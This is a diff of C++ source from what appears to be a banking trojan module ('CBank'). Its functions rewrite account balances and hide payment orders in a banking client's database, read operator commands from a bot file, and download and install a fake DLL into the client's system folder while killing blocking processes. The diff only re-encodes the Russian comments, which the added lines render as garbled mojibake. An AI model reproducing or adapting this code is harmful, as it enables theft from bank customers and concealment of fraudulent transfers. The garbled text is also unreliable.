-	hidePayments[n].account[0] = 0; //конец массива
+	hidePayments[n].account[0] = 0; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 }
 
-//корректировка баланса
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void ReplacementBalance()
 {
-	DBG( "CBank", "Осуществляем подмену баланса" );
+	DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	int n = 0;
 	ODBC* DB = CreateDB();
 	if( DB )
@@ -524,32 +535,32 @@ static void ReplacementBalance()
 		fwsprintfA pwsprintfA = Get_wsprintfA();
 		while( restAccounts[n].account[0] )
 		{
-			DBG( "CBank", "Счет %s, разница %d", restAccounts[n].account, restAccounts[n].diff );
+			DBG( "CBank", "пїЅпїЅпїЅпїЅ %s, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %d", restAccounts[n].account, restAccounts[n].diff );
 			char openingBalance[16], closingBalance[16];
 			TIMESTAMP_STRUCT dateBalance;
 			ClearStruct(dateBalance);
-			//выбираем информацию о балансе с начала указанной даты
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			sql = "select OPENINGBALANCE,CLOSINGBALANCE,STATEMENTDATE from STATEMENTRU where ACCOUNT=? and STATEMENTDATE>=? and OPENINGBALANCE<>0 order by STATEMENTDATE";
 			SQLHSTMT qr = DB->ExecuteSql( sql, "os16 os16 ot is16 it", openingBalance, closingBalance, &dateBalance, restAccounts[n].account, &restAccounts[n].date );
 			if( qr )
 			{
 				do
 				{
-					DBG( "CBank", "Входной баланс: %s, выходной баланс: %s", openingBalance, closingBalance );
-					DBG( "CBank", "Дата %02d.%02d.%02d", dateBalance.day, dateBalance.month, dateBalance.year );
+					DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: %s, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: %s", openingBalance, closingBalance );
+					DBG( "CBank", "пїЅпїЅпїЅпїЅ %02d.%02d.%02d", dateBalance.day, dateBalance.month, dateBalance.year );
 					DWORD obalance = SumToInt( openingBalance, 0 );
 					DWORD cbalance = SumToInt( closingBalance, 0 );
-					//смотрим была ли уже подмена
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					int m = 0;
-					bool update = false; //true - если нужно делать запись новых балансов в базу
+					bool update = false; //true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 					while( restFixeds && restFixeds[m].account[0] )
 					{
 						if( m_lstrcmp( restAccounts[n].account, restFixeds[m].account ) == 0 &&
 							m_memcmp( &restFixeds[m].date, &dateBalance, sizeof(dateBalance) ) == 0 )
 						{
-							//нашли, значит были на этой строке, сверяем
-							//открывающий баланс можно изменять только если дата не равна дате с которой нужно менять
-							//так как платежка прошла в этот день и соотвественно начальный баланс не меняется
+							//пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+							//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+							//пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 							if( m_memcmp( &restFixeds[m].date, &restAccounts[n].date, sizeof(dateBalance) ) != 0 &&
 								/*restFixeds[m].openingBalance + */restAccounts[n].diff != obalance )
 							{
@@ -565,9 +576,9 @@ static void ReplacementBalance()
 						}
 						m++;
 					}
-					if( restFixeds == 0 || restFixeds[m].account[0] == 0 ) //такой строки еще не было
+					if( restFixeds == 0 || restFixeds[m].account[0] == 0 ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 					{
-						if( (m + 1) * sizeof(RestAccountFixed) > sizeRestFixeds ) //недостаточно памяти
+						if( (m + 1) * sizeof(RestAccountFixed) > sizeRestFixeds ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 						{
 							sizeRestFixeds += 5 * sizeof(RestAccountFixed);
 							restFixeds = (RestAccountFixed*)MemRealloc( restFixeds, sizeRestFixeds );
@@ -576,9 +587,9 @@ static void ReplacementBalance()
 						restFixeds[m].openingBalance = obalance;
 						restFixeds[m].closingBalance = cbalance;
 						m_memcpy( &restFixeds[m].date, &dateBalance, sizeof(dateBalance) );
-						restFixeds[m + 1].account[0] = 0; //конец массива
-						//обновляем балансы
-						//в день платежки входящий баланс менять нельзя
+						restFixeds[m + 1].account[0] = 0; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+						//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+						//пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 						if( m_memcmp( &restFixeds[m].date, &restAccounts[n].date, sizeof(dateBalance) ) )
 							obalance = /*+=*/ restAccounts[n].diff;
 						cbalance = /*+=*/ restAccounts[n].diff;
@@ -586,8 +597,8 @@ static void ReplacementBalance()
 					}
 					if( update )
 					{
-						DBG( "CBank", "Новые входной баланс: %u, выходной баланс: %u", obalance, cbalance );
-						///отсылаем запрос на обновление
+						DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: %u, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: %u", obalance, cbalance );
+						///пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 						sql = "update STATEMENTRU set OPENINGBALANCE=%d.%d, CLOSINGBALANCE = %d.%d where ACCOUNT=? and STATEMENTDATE=?";
 						pwsprintfA( sqlBuf.AsStr(), sql, obalance / 100, obalance % 100, cbalance / 100, cbalance % 100 );
 						DBG( "CBank", "%s", sqlBuf.AsStr() );
@@ -597,7 +608,7 @@ static void ReplacementBalance()
 				} while( DB->NextRow(qr) );
 				DB->CloseQuery(qr);
 			}
-			//берем последний баланс и ложим его в таблицу счетов
+			//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			sql = "select CLOSINGBALANCE from STATEMENTRU where STATEMENTDATE=(select Max(STATEMENTDATE) from STATEMENTRU) and CLOSINGBALANCE<>0";
 			qr = DB->ExecuteSql( sql, "os16", closingBalance );
 			if( qr )
@@ -616,14 +627,14 @@ static void ReplacementBalance()
 	}
 }
 
-//скрытие платежек
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void HidePayments()
 {
-	DBG( "CBank", "Скрываем платежки" );
+	DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	ODBC* DB = CreateDB();
 	if( DB )
 	{
-		TIMESTAMP_STRUCT dateFirst; //самая ранняя дата платежек
+		TIMESTAMP_STRUCT dateFirst; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		const char* sql = "select min(DOCUMENTDATE) from PAYDOCRU";
 		SQLHSTMT qr = DB->ExecuteSql( sql, "ot", &dateFirst );
 		if( qr )
@@ -634,7 +645,7 @@ static void HidePayments()
 			int n = 0;
 			while( hidePayments[n].account[0] )
 			{
-				DBG( "CBank", "Скрываем платежку %s %s", hidePayments[n].account, hidePayments[n].num );
+				DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s %s", hidePayments[n].account, hidePayments[n].num );
 				sql = "update PAYDOCRU set DOCUMENTDATE=?, STATUS=30001 where PAYERACCOUNT=? and DOCUMENTDATE=? and DOCUMENTNUMBER like '%%%s%%'";
 				pwsprintfA( sqlBuf.AsStr(), sql, hidePayments[n].num );
 				DBG( "CBank", "%s", sqlBuf.AsStr() );
@@ -650,7 +661,7 @@ static void HidePayments()
 static DWORD WINAPI ThreadHideReplacement(void*)
 {
 	pSleep(5000);
-	//ждем пока появится строка подключения
+	//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	do
 	{
 		pSleep(1000);
@@ -661,21 +672,21 @@ static DWORD WINAPI ThreadHideReplacement(void*)
 	string fileFlag = BOT::MakeFileName( 0, GetStr(CBankFlagUpdate).t_str() );
 	for(;;)
 	{
-		DBG( "CBank", "Запуск подмены и скрытия" );
+		DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		DWORD size;
-		//в считываемом файле в конце данных должен быть обязательно 0 или любой другой символ,
-		//чтобы потом вставить 0 и получить полноценную строку. 
-		//Это нужно учитывать при создании файла
+		//пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 0 пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+		//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 0 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. 
+		//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		char* rpl = (char*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(CBankReplacement).t_str() ).t_str(), size );
 		//char* rpl = (char*)File::ReadToBufferA( "c:\\11.txt", size );
 		if( rpl )
 		{
-			VideoProcess::RecordPID( 0, "CBank" ); //видео пишем только когда была команда на подмену
+			VideoProcess::RecordPID( 0, "CBank" ); //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			rpl[size - 1] = 0;
 			ReadReplacement(rpl);
 			MemFree(rpl);
 		}
-		//удаляем флаг запуска подмены
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		pDeleteFileA( fileFlag.t_str() );
 		ReplacementBalance();
 		HidePayments();
@@ -702,24 +713,24 @@ static DWORD WINAPI InstallFakeDll( void* pathExe )
 	char pathSystem[MAX_PATH];
 	m_lstrcpy( pathSystem, (char*)pathExe );
 	STR::Free((char*)pathExe);
-	pPathRemoveFileSpecA(pathSystem); //папка Exe
-	pPathRemoveFileSpecA(pathSystem); //папка клиента
-	pPathAppendA( pathSystem, "system" ); //папка system, в которой длл для подмены
+	pPathRemoveFileSpecA(pathSystem); //пїЅпїЅпїЅпїЅпїЅ Exe
+	pPathRemoveFileSpecA(pathSystem); //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	pPathAppendA( pathSystem, "system" ); //пїЅпїЅпїЅпїЅпїЅ system, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if( BOT::FakeDllCBankInstalled() ) 
 	{
-		DBG( "CBank", "fake.dll уже установлена" );
+		DBG( "CBank", "fake.dll пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		return 0; 
 	}
 
-	DBG("CBank", "Начинаем инсталяцию fake.dll");
+	DBG("CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ fake.dll");
 	
 	TPlugin intaller(GetStr(EStrFakeDllInstaller));
 
-	// Загружаем плагин
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!intaller.Download(true))
 	{
-		DBG("CBank", "Плагин не удалось загрузить" );
+		DBG("CBank", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		return 0;
 	}
 
@@ -727,35 +738,35 @@ static DWORD WINAPI InstallFakeDll( void* pathExe )
 	DWORD dllSize;
 	if( !LoadBotPlug( &dllBody, &dllSize ) ) return FALSE;
 
-	DBG("CBank", "Плагин успешно загружены, начинаем инсталцию");
+	DBG("CBank", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
-	// Запускаем инсталяцию
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	typedef BOOL (WINAPI *TInstall2)(const char* nameDll, BYTE* dllBody, DWORD dllSize);
 
 	TInstall2 install;
 	if( intaller.GetProcAddress( 0x4CA88DAD /* Install2 */, (LPVOID&)install ) )
 	{
 		bool installed = false;
-		//выделяем место для бот плага
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		BYTE* botData = (BYTE*)MemAlloc(dllSize);
 		if( botData )
 		{
 			DWORD rand = (DWORD)pGetTickCount();
 			int n = rand % ARRAYSIZE(dlls);
-			for( int j = 0; j < 5; j++ ) //делаем 5 попыток установки, ошибка в инсталяции может быть из-за отсутствия нужной длл, на следующей попытке будет выбрана другая
+			for( int j = 0; j < 5; j++ ) //пїЅпїЅпїЅпїЅпїЅпїЅ 5 пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			{
 				pPathAppendA( pathSystem, dlls[n] );
 				KillBlockingProcesses(dlls[n]);
 				m_memcpy( botData, dllBody, dllSize );
 				if( install( pathSystem, botData, dllSize ) )
 				{
-					DBG("CBank", "Инсталяция fake.dll успешно выполнена" );
+					DBG("CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ fake.dll пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 					installed = true;
 					break;
 				}
 				else
 				{
-					DBG("CBank", "Инсталяция fake.dll не выполнена" );
+					DBG("CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ fake.dll пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 					n++;
 					if( n >= ARRAYSIZE(dlls) ) n = 0;
 				}
